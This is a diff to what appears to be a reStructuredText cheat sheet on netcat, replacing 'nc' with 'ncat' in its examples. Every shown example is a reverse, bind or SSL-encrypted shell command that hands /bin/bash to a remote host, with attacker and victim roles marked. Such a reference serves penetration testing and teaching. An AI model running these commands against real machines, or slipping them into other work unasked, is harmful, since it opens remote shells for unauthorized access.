@@ -55,14 +55,14 @@ Reverse shells:
     # Server (attacker machine)
     nc -lp 8080
     # Client (victim machine)
-    nc -e /bin/bash 192.168.125.10 8080
+    ncat -e /bin/bash 192.168.125.10 8080
 
 Bind shells:
 
 .. code-block:: sh
 
     # Server (victim machine)
-    nc -e /bin/bash -lp 8080
+    ncat -e /bin/bash -lp 8080
     # Client (attacker machine)
     nc 192.168.125.10 8080
 
@@ -74,7 +74,7 @@ Ncat encrypted reverse shell:
     ncat --ssl -e /bin/bash 192.168.125.10 8080
 
     # allow connections only from specific host
-    nc --allow 127.0.0.1 -e /bin/bash -lvnp 8000
+    ncat --allow 127.0.0.1 -e /bin/bash -lvnp 8000
 
 HTTP Client and Server
 ######################
